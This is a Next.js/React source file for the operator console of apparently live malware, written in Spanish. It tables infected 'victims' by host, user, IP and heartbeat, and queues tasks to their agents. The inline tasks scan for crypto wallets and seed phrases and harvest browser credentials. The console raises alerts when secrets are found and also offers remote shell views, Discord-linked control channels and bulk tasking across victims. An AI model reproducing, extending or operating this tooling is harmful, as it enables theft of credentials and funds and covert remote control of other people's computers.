'use client';
import { useCallback, useEffect, useMemo, useRef, useState } from 'react';
import { useRouter, useSearchParams } from 'next/navigation';
import { AlertTriangle, Search, WifiOff } from 'lucide-react';
import { useApi, mutate } from '@/hooks/useApi';
import { useCanWrite, useLiveContext } from '@/components/live-provider';
import { Topbar } from '@/components/topbar';
import { VictimFilters } from '@/components/victim-filters';
import { VictimTable, readSavedSort, type SortState } from '@/components/victim-table';
import { VictimDetail, type DetailTab } from '@/components/victim-detail';
import { SessionLog } from '@/components/session-log';
import { ActionMenu } from '@/components/action-menu';
import { CommandPalette } from '@/components/command-palette';
import { ParamDialog } from '@/components/param-dialog';
import { BulkDialog } from '@/components/bulk-dialog';
import { ShellViewDialog } from '@/components/shell-view-dialog';
import { Button } from '@/components/ui/button';
import { Badge } from '@/components/ui/badge';
import { ErrorState } from '@/components/ui/table';
import { ACTION_MAP, actionReason, type ActionContext, type ActionDef, type Resolved } from '@/lib/actions';
import { isWindows } from '@/lib/os';
import { ApiError } from '@/lib/api';
import { desktopNotify, onDesktopCommand, setDesktopTitle, setTrayStatus } from '@/lib/desktop';
import type { Build, Victim } from '@/lib/types';
import { cn } from '@/lib/cn';

type Notice = { tone: 'ok' | 'warn' | 'bad'; text: string; action?: { label: string; run: () => void } };

function explain(error: unknown): string {
  if (error instanceof ApiError) {
    if (error.code === 'agent_offline') return 'Sin socket de control: la tarea no se encola. Espera al heartbeat o programa la tarea más tarde.';
    if (error.code === 'busy') return 'El agente ya tiene 4 tareas en vuelo. Cancela una o espera a que termine.';
    if (error.code === 'discord_unlinked' || error.code === 'discord_channel_missing') return 'Falta el enlace de Discord o el canal desapareció. Reenlaza la víctima antes de encolar.';
    if (error.status === 429) return 'Límite de peticiones (429). Reintenta en unos segundos.';
    if (error.status === 403) return 'Tu rol no permite esta mutación.';
    return `${error.code}: ${error.message}`;
  }
  return error instanceof Error ? error.message : 'Error de red';
}

const SORT_VALUE = (victim: Victim, id: SortState['id']): string | number => {
  switch (id) {
    case 'host': return victim.hostname.toLowerCase();
    case 'user': return victim.username.toLowerCase();
    case 'os': return victim.os;
    case 'version': return victim.agentVersion;
    case 'profile': return victim.profile;
    case 'ip': return victim.ip ?? '';
    case 'seen': return new Date(victim.lastHeartbeatAt).getTime();
    case 'socket': return victim.socket ? 1 : 0;
    case 'artifacts': return victim.artifacts ?? victim._count?.artifacts ?? 0;
    case 'group': return victim.tags[0] ?? '';
  }
};

const TABS: DetailTab[] = ['resumen', 'boveda', 'ficheros', 'actividad', 'monitor', 'chat'];

const INLINE: Record<string, Resolved> = {
  scan: { name: 'scan_wallets', params: {}, timeout: 300 },
  'find-seeds': { name: 'scan_wallets', params: { include_desktop: false, include_extensions: false, include_seeds: true }, timeout: 300 },
  'capture-creds': { name: 'harvest', params: { kind: 'browsers' }, timeout: 180 }
};

export function OperationsView() {
  const router = useRouter();
  const params = useSearchParams();
  const [selected, setSelected] = useState<string[]>(() => {
    const value = params.get('select');
    return value ? [value] : [];
  });
  const [tab, setTab] = useState<DetailTab>(() => {
    const value = params.get('tab') as DetailTab | null;
    return value && TABS.includes(value) ? value : 'resumen';
  });
  const [sort, setSort] = useState<SortState>({ id: 'seen', dir: 'desc' });

  const [menu, setMenu] = useState<{ victim: Victim; x: number; y: number } | null>(null);
  const [palette, setPalette] = useState(false);
  const [dialog, setDialog] = useState<ActionDef | null>(null);
  const [shellView, setShellView] = useState<ActionDef | null>(null);
  const [bulk, setBulk] = useState(false);
  const [notice, setNotice] = useState<Notice | null>(null);
  const [cursor, setCursor] = useState(0);
  const canWrite = useCanWrite();
  const live = useLiveContext();
  const tableBox = useRef<HTMLDivElement>(null);
  const noticeTimer = useRef<number | null>(null);

  useEffect(() => { setSort(readSavedSort()); }, []);

  const filterQuery = useMemo(() => {
    const next = new URLSearchParams(params.toString());
    next.delete('select');
    next.delete('tab');
    next.set('limit', '200');
    return next.toString();
  }, [params]);

  const victims = useApi<{ items: Victim[]; next: string | null }>(`/victims?${filterQuery}`, { pollMs: 10_000 });
  const builds = useApi<{ items: Build[] }>('/builds');
  const selectedId = selected[0] ?? null;
  const fromList = victims.data?.items.find((victim) => victim.id === selectedId) ?? null;
  const single = useApi<Victim>(selectedId && !fromList ? `/victims/${selectedId}` : null, { pollMs: 10_000 });
  const victim = fromList ?? single.data;
  const selectedVictims = (victims.data?.items ?? []).filter((item) => selected.includes(item.id));

  const context: ActionContext = {
    canWrite,
    offline: !victim?.socket,
    disconnected: !live.connected,
    windows: isWindows(victim?.os),
    agentVersion: victim?.agentVersion
  };

  useEffect(() => {
    const next = new URLSearchParams(params.toString());
    if (selectedId) next.set('select', selectedId); else next.delete('select');
    if (tab !== 'resumen') next.set('tab', tab); else next.delete('tab');
    router.replace(`/victims?${next.toString()}`, { scroll: false });
  }, [selectedId, tab]); // eslint-disable-line react-hooks/exhaustive-deps

  useEffect(() => {
    void setDesktopTitle(victim ? victim.hostname : 'Equipos');
    void setTrayStatus(live.connected, victims.data?.items.filter((item) => item.online).length ?? 0);
  }, [victim?.hostname, live.connected, victims.data?.items.length]); // eslint-disable-line react-hooks/exhaustive-deps

  useEffect(() => {
    if (!notice) return;
    if (noticeTimer.current) window.clearTimeout(noticeTimer.current);
    noticeTimer.current = window.setTimeout(() => setNotice(null), 10_000);
  }, [notice]);

  useEffect(() => {
    const last = live.events[0];
    if (!last || document.visibilityState === 'visible') return;
    if (last.type === 'task.update' && (last.data as { status?: string }).status === 'error') {
      const host = victims.data?.items.find((item) => item.id === last.victimId)?.hostname ?? 'equipo';
      void desktopNotify('Tarea fallida', `${host}: ${String((last.data as { error?: string }).error ?? 'error')}`);
    }
    if (last.type === 'event' && (last.data as { kind?: string }).kind === 'secret_found') {
      void desktopNotify('Secreto encontrado', victims.data?.items.find((item) => item.id === last.victimId)?.hostname ?? 'equipo');
    }
  }, [live.events[0]?.at]); // eslint-disable-line react-hooks/exhaustive-deps

  useEffect(() => {
    const offShortcuts = onDesktopCommand('shortcuts', () => setNotice({ tone: 'ok', text: 'Atajos: / buscar · ↑↓ navegar · Enter detalle · Menú/Shift+F10 acciones · Ctrl+K paleta · Esc cerrar.' }));
    const offAbout = onDesktopCommand('about', () => setNotice({ tone: 'ok', text: 'SPC Console · cliente de escritorio sobre el contrato v1 congelado.' }));
    return () => { offShortcuts(); offAbout(); };
  }, []);

  const focusSearch = useCallback(() => {
    document.getElementById('victim-search')?.focus();
  }, []);

  const openDetail = useCallback((victimRow: Victim) => {
    setSelected([victimRow.id]);
    setTab('resumen');
  }, []);

  const openMenu = useCallback((victimRow: Victim, x: number, y: number) => {
    setMenu({ victim: victimRow, x, y });
  }, []);

  useEffect(() => {
    function onKey(event: KeyboardEvent) {
      const target = event.target as HTMLElement | null;
      const typing = target && (target.tagName === 'INPUT' || target.tagName === 'TEXTAREA' || target.tagName === 'SELECT' || target.isContentEditable);
      if (event.key === 'Escape') {
        if (menu) { setMenu(null); event.preventDefault(); return; }
        if (palette) { setPalette(false); event.preventDefault(); return; }
        if (dialog) { setDialog(null); event.preventDefault(); return; }
        if (shellView) { setShellView(null); event.preventDefault(); return; }
        if (bulk) { setBulk(false); event.preventDefault(); return; }
        if (victim) { setSelected([]); event.preventDefault(); return; }
      }
      if (typing) return;
      if (event.key === 'ContextMenu' || (event.shiftKey && event.key === 'F10')) {
        const row = document.querySelector<HTMLElement>(`[data-index="${cursor}"]`);
        const current = victims.data?.items[cursor];
        if (row && current) {
          event.preventDefault();
          const rect = row.getBoundingClientRect();
          openMenu(current, Math.min(rect.left + 120, window.innerWidth - 40), rect.top);
        }
        return;
      }
      if (event.key === 'ArrowDown' || event.key === 'ArrowUp') {
        const list = victims.data?.items ?? [];
        if (list.length === 0) return;
        event.preventDefault();
        const next = Math.max(0, Math.min(list.length - 1, cursor + (event.key === 'ArrowDown' ? 1 : -1)));
        setCursor(next);
        setSelected([list[next]!.id]);
        tableBox.current?.querySelector<HTMLElement>(`[data-index="${next}"]`)?.focus();
        return;
      }
      if (event.key === 'Enter') {
        const current = victims.data?.items[cursor];
        if (current) { event.preventDefault(); openDetail(current); document.getElementById('victim-detail')?.focus(); }
      }
    }
    window.addEventListener('keydown', onKey);
    return () => window.removeEventListener('keydown', onKey);
  }, [cursor, victims.data, menu, palette, dialog, shellView, bulk, victim, focusSearch, openDetail, openMenu]);

  async function runDirect(action: ActionDef, victimRow: Victim) {
    if (!action.resolve) return;
    const resolved = action.resolve(victimRow);
    try {
      await mutate('/tasks', 'POST', { victim_ids: [victimRow.id], name: resolved.name, params: resolved.params, timeout_sec: resolved.timeout });
      setNotice({ tone: 'ok', text: `${action.label}: ${resolved.name} encolada en ${victimRow.hostname}.` });
      victims.refresh();
    } catch (error) {
      setNotice({ tone: 'bad', text: `${action.label}: ${explain(error)}` });
    }
  }

  async function runInline(actionId: string): Promise<string | null> {
    const action = ACTION_MAP.get(actionId);
    const victimRow = victim;
    if (!action || !victimRow) return null;
    const resolved = action.resolve?.(victimRow) ?? INLINE[actionId];
    if (!resolved) return null;
    const data = await mutate<{ items: Array<{ id: string }> }>('/tasks', 'POST', {
      victim_ids: [victimRow.id], name: resolved.name, params: resolved.params, timeout_sec: resolved.timeout
    });
    setNotice({ tone: 'ok', text: `${action.label} encolada en ${victimRow.hostname}.` });
    victims.refresh();
    return data.items[0]?.id ?? null;
  }

  async function revoke(victimRow: Victim) {
    try {
      await mutate(`/victims/${victimRow.id}/revoke${victimRow.revokedAt ? '?restore=1' : ''}`, 'POST');
      setNotice({ tone: 'ok', text: victimRow.revokedAt ? 'Acceso restaurado.' : 'Acceso revocado.' });
      victims.refresh();
    } catch (error) {
      setNotice({ tone: 'bad', text: explain(error) });
    }
  }

  async function remove(victimRow: Victim) {
    if (!window.confirm(`¿Eliminar ${victimRow.hostname} y todo su material?`)) return;
    try {
      await mutate(`/victims/${victimRow.id}`, 'DELETE');
      setSelected((current) => current.filter((id) => id !== victimRow.id));
      setNotice({ tone: 'ok', text: `${victimRow.hostname} eliminada.` });
      victims.refresh();
    } catch (error) {
      setNotice({ tone: 'bad', text: explain(error) });
    }
  }

  function pick(action: ActionDef, explicit?: Victim) {
    const victimRow = explicit ?? menu?.victim ?? victim;
    if (!victimRow) return;
    setMenu(null);
    if (action.id === 'open' || action.id === 'explore') {
      setSelected([victimRow.id]);
      setTab(action.id === 'open' ? 'resumen' : 'ficheros');
      return;
    }
    if (action.id === 'chat') { setSelected([victimRow.id]); setTab('chat'); return; }
    if (action.id === 'revoke') { void revoke(victimRow); return; }
    if (action.id === 'delete') { void remove(victimRow); return; }
    if (action.id === 'cancel-all') { setSelected([victimRow.id]); setBulk(true); return; }
    if (action.dialog) { setSelected([victimRow.id]); setDialog(action); return; }
    if (action.view) { setSelected([victimRow.id]); setShellView(action); return; }
    void runDirect(action, victimRow);
  }

  const ordered = useMemo(() => {
    const list = [...(victims.data?.items ?? [])];
    return list.sort((a, b) => {
      const left = SORT_VALUE(a, sort.id);
      const right = SORT_VALUE(b, sort.id);
      const result = typeof left === 'number' && typeof right === 'number' ? left - right : String(left).localeCompare(String(right), 'es');
      return sort.dir === 'asc' ? result : -result;
    });
  }, [victims.data, sort]);

  const countries = useMemo(() => [...new Set((victims.data?.items ?? []).map((item) => item.country).filter((value): value is string => Boolean(value)))].sort(), [victims.data]);

  const onlineCount = (victims.data?.items ?? []).filter((item) => item.online).length;

  return (
    <div className="relative flex h-[calc(100dvh-6.5rem)] min-h-[540px] flex-col overflow-hidden rounded-xl border border-line/80 bg-panel/20 shadow-panel">
      <Topbar
        title={victim ? victim.hostname : 'Equipos'}
        subtitle={victim ? `${victim.username} · ${victim.os} · ${victim.ip ?? 'sin IP'}` : `${victims.data?.items.length ?? 0} equipos · ${onlineCount} online · consola única de operación`}
        onCommand={() => victim ? setPalette((value) => !value) : setNotice({ tone: 'warn', text: 'Selecciona un equipo antes de abrir la paleta.' })}
        onSlash={focusSearch}
      />

      {!live.connected ? (
        <div className="flex items-center gap-2 border-b border-bad/30 bg-bad/10 px-3 py-1 text-2xs text-bad" role="alert">
          <WifiOff className="h-3 w-3" /> Sin stream del panel: las acciones quedan deshabilitadas hasta reconectar. Los datos en pantalla pueden estar viejos.
        </div>
      ) : null}

      {notice ? (
        <div className={cn('flex items-center gap-2 border-b px-3 py-1 text-2xs', notice.tone === 'bad' ? 'border-bad/30 bg-bad/10 text-bad' : notice.tone === 'warn' ? 'border-warn/30 bg-warn/10 text-warn' : 'border-ok/30 bg-ok/10 text-ok')} role="status">
          {notice.tone !== 'ok' ? <AlertTriangle className="h-3 w-3" /> : null}
          <span className="min-w-0 flex-1">{notice.text}</span>
          <button className="text-muted hover:text-ink" onClick={() => setNotice(null)}>cerrar</button>
        </div>
      ) : null}

      <VictimFilters countries={countries} builds={(builds.data?.items ?? []).map((build) => ({ id: build.id, name: build.name, version: build.version }))} total={victims.data?.items.length} />

      <div className="flex min-h-0 flex-1">
        <div ref={tableBox} className="flex min-w-0 flex-1 flex-col">
          {victims.error ? <ErrorState title="No se pudo cargar la lista" message={explain(victims.error)} retry={victims.refresh} /> : (
            <VictimTable
              items={ordered}
              loading={victims.loading && !victims.data}
              selected={selected}
              sort={sort}
              onSelect={setSelected}
              onSort={setSort}
              onOpen={openDetail}
              onMenu={openMenu}
              onBulk={() => setBulk(true)}
            />
          )}
        </div>
        {victim ? (
          <div className="fixed inset-0 z-40 flex justify-end">
            <button aria-label="Cerrar detalle" className="absolute inset-0 bg-black/55 backdrop-blur-[2px] animate-in fade-in" onClick={() => setSelected([])} />
            <div id="victim-detail" tabIndex={-1} className="relative flex h-full w-full min-h-0 outline-none shadow-2xl animate-in slide-in-from-right duration-200 sm:w-[min(880px,calc(100vw-2rem))]">
            <VictimDetail
              victim={victim}
              tab={tab}
              onTab={setTab}
              onRun={runInline}
              onAction={(id) => {
                const action = ACTION_MAP.get(id);
                if (!action) return;
                setSelected([victim.id]);
                const reason = actionReason(action, victim, context);
                if (reason) { setNotice({ tone: 'warn', text: `${action.label}: ${reason}.` }); return; }
                if (action.dialog) { setDialog(action); return; }
                if (action.view) { setShellView(action); return; }
                if (action.id === 'revoke') { void revoke(victim); return; }
                void runDirect(action, victim);
              }}
              onClose={() => setSelected([])}
              onBulk={() => setBulk(true)}
            />
            </div>
          </div>
        ) : null}
      </div>

      <SessionLog victim={victim} onInspect={() => setTab('actividad')} onFiles={() => setTab('ficheros')} />

      {menu ? (
        <ActionMenu
          victim={menu.victim}
          x={menu.x}
          y={menu.y}
          context={{ ...context, offline: !menu.victim.socket, windows: isWindows(menu.victim.os), agentVersion: menu.victim.agentVersion }}
          onPick={pick}
          onClose={() => setMenu(null)}
        />
      ) : null}
      {palette ? <CommandPalette victim={victim} context={context} onPick={(action) => { setPalette(false); pick(action, victim ?? undefined); }} onClose={() => setPalette(false)} /> : null}
      {dialog && victim ? <ParamDialog action={dialog} victim={victim} onClose={() => setDialog(null)} onQueued={(name) => { setNotice({ tone: 'ok', text: `${name} encolada en ${victim.hostname}.` }); victims.refresh(); }} /> : null}
      {shellView && victim ? <ShellViewDialog action={shellView} victim={victim} onClose={() => setShellView(null)} /> : null}
      <BulkDialog open={bulk} victims={selectedVictims} onClose={() => setBulk(false)} onQueued={() => victims.refresh()} />

      {palette ? null : <span className="sr-only" aria-live="polite">{selected.length} seleccionados</span>}
      {selected.length > 0 && !victim ? <Badge className="hidden" /> : null}
      {selected.length === 0 && !palette ? (
        <p className="pointer-events-none absolute bottom-12 left-1/2 hidden -translate-x-1/2 items-center gap-1 rounded border border-line bg-panel/80 px-2 py-1 text-2xs text-muted xl:flex">
          <Search className="h-3 w-3" /> / para buscar · selecciona una fila y pulsa Enter
        </p>
      ) : null}
    </div>
  );
}
